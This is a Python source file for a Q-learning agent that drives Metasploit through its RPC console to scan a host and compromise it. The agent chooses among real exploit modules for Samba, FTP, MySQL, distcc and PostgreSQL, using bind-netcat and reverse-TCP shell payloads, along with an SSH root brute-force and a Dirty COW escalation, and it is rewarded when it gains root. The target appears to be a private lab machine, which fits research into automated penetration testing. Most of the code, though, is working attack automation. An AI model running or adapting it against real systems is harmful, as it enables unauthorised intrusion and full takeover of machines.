# coding=utf-8
"""
This part of code is the Q learning brain, which is a brain of the agent.
All decisions are made in here.

View more on my tutorial page: https://morvanzhou.github.io/tutorials/
"""

import numpy as np
import pandas as pd
import time
import re
import ast
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole


class QLearningTable:
        
    def __init__(self, actions, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9):
        self.actions = self.initialise_all_actions().keys()  # a list
        self.lr = learning_rate
        self.gamma = reward_decay
        self.epsilon = e_greedy
        self.q_tables = {}
        self.q_table = pd.DataFrame(columns=self.actions, dtype=np.float64)
        
        self.global_positive_out = list()
        self.global_console_status = False
        self.nmap_dict={}
        self.success=False
        self.whoami= 'Not root'
        self.action_in_the_right_shell= False
        self.session=0
        self.session_regex= re.compile("session ([0-9]*)")
        self.action_iteration= 0
        self.all_actions= self.initialise_all_actions()
        
        self.client = MsfRpcClient('password')
        self.console = MsfRpcConsole(self.client, cb=self.read_console)
        
    def read_console(self, console_data):
        self.global_console_status = console_data['busy']
        #print global_console_status
        
        if '[+]' in console_data['data']:
            sigdata = console_data['data'].rstrip().split('\n')
            for line in sigdata:
                    if '[+]' in line:
                    		self.global_positive_out.append(line)
                            
        if 'Nmap' in console_data['data']:
            self.traitement_nmap(console_data['data'])
                            
        if ("Success" in console_data['data']) or ("opened" in console_data['data']):
            self.success= True
            #print('success='+ str(success))
        else:
            self.success= False
            
        if ("root" in console_data['data']):
            self.whoami = 'root'
        else:
            self.whoami = 'Not root'
            
        if self.session_regex.search(console_data['data']) != None:
            self.session= self.session_regex.search(console_data['data']).group(1)
            
        if ("Unknown" in console_data['data']) or ("not found" in console_data['data']):
            self.action_in_the_right_shell= False
        else:
            self.action_in_the_right_shell= True
            
            
        print console_data['data']
        
    def initialise_all_actions(self):
        # retourne un dictionnaire { str(action): action}
        return {
                #str(self.ssh_login): self.ssh_login,
                str(self.samba): self.samba,
                str(self.ftp1): self.ftp1,
                str(self.mysql): self.mysql,
                str(self.dirtyCow): self.dirtyCow,
                #str(self.ls): self.ls,
                #str(self.distcc): self.distcc,
                str(self.postgresql): self.postgresql
                }

    def choose_action(self, observation):
        print('\nOBSERVATION: ' + str(observation))
        self.check_state_exist(observation)
        # action selection
        if np.random.uniform() < self.epsilon:
            # choose best action
            state_action = self.q_table.loc[observation, :]
            # some actions may have the same value, randomly choose on in these actions
            action = self.all_actions[np.random.choice(state_action[state_action == np.max(state_action)].index)]
        else:
            # choose random action
            action = self.all_actions[np.random.choice(self.actions)]
        return action

    def learn(self, s, a, r, s_):
        self.check_state_exist(s_)
        q_predict = self.q_table.loc[s, str(a)]
        if s_ != 'terminal':
            q_target = r + self.gamma * self.q_table.loc[s_, :].max()  # next state is not terminal
        else:
            q_target = r  # next state is terminal
        self.q_table.loc[s, str(a)] += self.lr * (q_target - q_predict)  # update

    def check_state_exist(self, state):
        if state not in self.q_table.index:
            # append new state to q table
            self.q_table = self.q_table.append(
                pd.Series(
                    [0]*len(self.actions),
                    index=self.q_table.columns,
                    name=state,
                )
            )
                    
    def step(self, action, observation):
        print("\nACTION: " + str(action))
        #print(type(action))
        time.sleep(5)
        
        #preparation de l'etat suivant
        self.action_iteration +=1
        observation_dict = ast.literal_eval(observation)
        observation_dict['action '+ str(self.action_iteration)]=str(action)
        
        #lancement de l'action et récupération des résultats
        (success2, whoami2)= action() # à vérifier

        #time.sleep(20) # modifier, pas bon de faire comme ça
        
        # reward function
        if whoami2 == 'root':
            reward = 1 
            done = True
            s_ = 'terminal'
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
        elif (whoami2 != 'root') and (success2==True) : # à optimiser
            reward = 0
            done = False
            s_ = str(observation_dict)  # voir comment récuperer la string 'ssh_login' de la fonction dont le nom est ssh_login()
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
        elif (success2 == False): # à optimiser
            reward = -1
            done = True
            s_= 'terminal'
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
            
#        else:
#            reward = 0
#            done = False
        return s_, reward, done
    
    
    
    # ACTIONS OF THE REINFORCEMENT LEARNING MODEL
    def nmap(self):
        # à modifier
        print('nmap en cours ... \n')
        self.action_iteration= 0 # on reinitialise le nombre indiquant à quelle action on en est. Il faudra peut être mettre ça autre part que dans le nmap dans le cas où ce sera possible de réutiliser nmap au cours d'une série d'actions
        self.console.execute('nmap 192.168.56.101')
        time.sleep(20)
        return str(self.nmap_dict)
    
    def traitement_nmap(self, resultat_nmap):
        #fonction qui transforme la string renvoyée par la commande nmap en un dictionnaire {'numero_port': 'opened|closed'}
        a = re.compile(r"^([0-9]+)")
        b = re.compile(r"open|closed")
        
        for elt in resultat_nmap.split('\n'):
            if a.search(elt) != None and b.search(elt) != None:
                self.nmap_dict[a.search(elt).group(0)]=b.search(elt).group(0)
    
    def background(self): # met le shell sur la machine attaquée (s'il existe) en background
        print(self.global_console_status)
        self.console.execute('background')
        time.sleep(10)
        c= self.action_in_the_right_shell
        
        if c:
            self.console.execute('y')
            time.sleep(2)
            return
        
#        elif self.global_console_status: # à modifier surement, cet "elif" est fait pour l'action 'postgresql' et n'est pas forcément général
#            while( c==False ):
#                self.console.execute('exit')
#                time.sleep(4)
#                self.console.execute('background')
#                time.sleep(10)
#                c= self.action_in_the_right_shell
        
        
        return
    
    def ssh_login(self):
        RPORT='22'
        
        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use auxiliary/scanner/ssh/ssh_login')
            time.sleep(10)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOSTS 192.168.56.101')
                time.sleep(4)
                self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
                time.sleep(4)
                self.console.execute('set STOP_ON_SUCCESS true')
                time.sleep(4)
                self.console.execute('run')
                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console' 
            
                a= self.success
                
                if a:
                    self.console.execute('sessions -i ' + str(self.session))
                    time.sleep(4)
                    self.console.execute('whoami')
                    time.sleep(4)
                
                b= self.whoami
            
                #while self.global_console_status:
                #while console.console.read()['busy']:
                #time.sleep(2)
                return a, b
            
            else:
                return False, 'Not root'
        
        return False, 'Not root'
            
    def samba(self):
        RPORT='139'
        
        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/multi/samba/usermap_script')
            time.sleep(10)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOST 192.168.56.101')
                time.sleep(4)
                self.console.execute('set payload cmd/unix/bind_netcat')
                time.sleep(4)
                self.console.execute('exploit')
                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
                a= self.success
                print(a)
                
                if a:
                    self.console.execute('whoami')
                    
                time.sleep(4) #sans le sleep il y a des problemes d'ordre d'execution
                b= self.whoami
                
    #            if a:
    #                time.sleep(3) 
    #                self.console.execute('background')
    #                time.sleep(3)
    #                self.console.execute('y')
                
                return a, b
            
            else:
                return False, "Not root"
        
        return False, "Not root"
        
    def ftp1(self):
        RPORT='21'
        
        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
            time.sleep(10)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOST 192.168.56.101')
                time.sleep(4)
                self.console.execute('exploit')
                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
                a= self.success
                
                if a:
                    self.console.execute('whoami')
                    time.sleep(4)
                    
                b= self.whoami
                
                return a, b
            
            else:
                return False, 'Not root'
        
        return False, 'Not root'
    
    def mysql(self):
        RPORT='3306'
        
        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
            time.sleep(10)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOST 192.168.56.101')
                time.sleep(4)
                self.console.execute('exploit')
                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
                a= self.success
                
                if a:
                    self.console.execute('whoami')
                    time.sleep(4)
                
                b= self.whoami
            
                return a, b
            
            else:
                return False, 'Not root'
            
        return False, 'Not root'
        
        
    def distcc(self):
        RPORT='3632'
        
        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/unix/misc/distcc_exec')
            time.sleep(10)
            c=self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOSTS 192.168.56.101')
                time.sleep(3)
                self.console.execute('exploit')
                time.sleep(15)
                a=self.success
                
                if a:
                    self.console.execute('whoami')
                    time.sleep(4)
                
                b= self.whoami
            
                return a, b
            
            else:
                return False, 'Not root'
        
        return False, 'Not root'
        
    def postgresql(self):
        RPORT='5432'
        
        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
            self.console.execute('use exploit/linux/postgres/postgres_payload')
            time.sleep(10)
            c=self.action_in_the_right_shell
            
            if c:
                self.console.execute('set RHOSTS 192.168.56.101')
                time.sleep(3)
                self.console.execute('set payload linux/x86/shell_reverse_tcp')
                time.sleep(3)
                self.console.execute('set LHOST 192.168.56.1') # A MODIFIER
                time.sleep(3)
                self.console.execute('exploit')
                time.sleep(20)
                a=self.success
                
                if a:   
                    self.console.execute('whoami')
                    time.sleep(4)
                
                b= self.whoami
            
                return a, b
            
            else:
                return False, 'Not root'
        
        return False, 'Not root'
        
    
    def dirtyCow(self):  # suite de ssh_login
        self.console.execute('/tmp/cow')
        time.sleep(10) # (finalement j'en ai besoin) pas besoin finalement apparemment, car on reste sur le même thread
        c= self.action_in_the_right_shell
        
        if c:
            time.sleep(70)
            self.console.execute('/usr/bin/passwd')
            time.sleep(4)  # utile?
            self.console.execute('whoami')
            time.sleep(4)
            b= self.whoami
#            self.console.execute('background') # à modifier ?
#            time.sleep(4)
#            self.console.execute('y') # à modifier ?
            
            # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
            if b=='root':
                return True, 'root'
            else: 
                return False, 'Not root'
            
        else:
            return False, 'Not root'
        
    def ls(self):
        self.console.execute('ls')
        time.sleep(3)
        self.console.execute('whoami')
        time.sleep(3)
#        self.console.execute('background') # à modifier ?
#        time.sleep(4)
#        self.console.execute('y') # à modifier ?
        
        return True, 'Not root' # ls est juste une fonction de test c'est pourquoi je retourne n'importe quoi. A modifier
    

        
            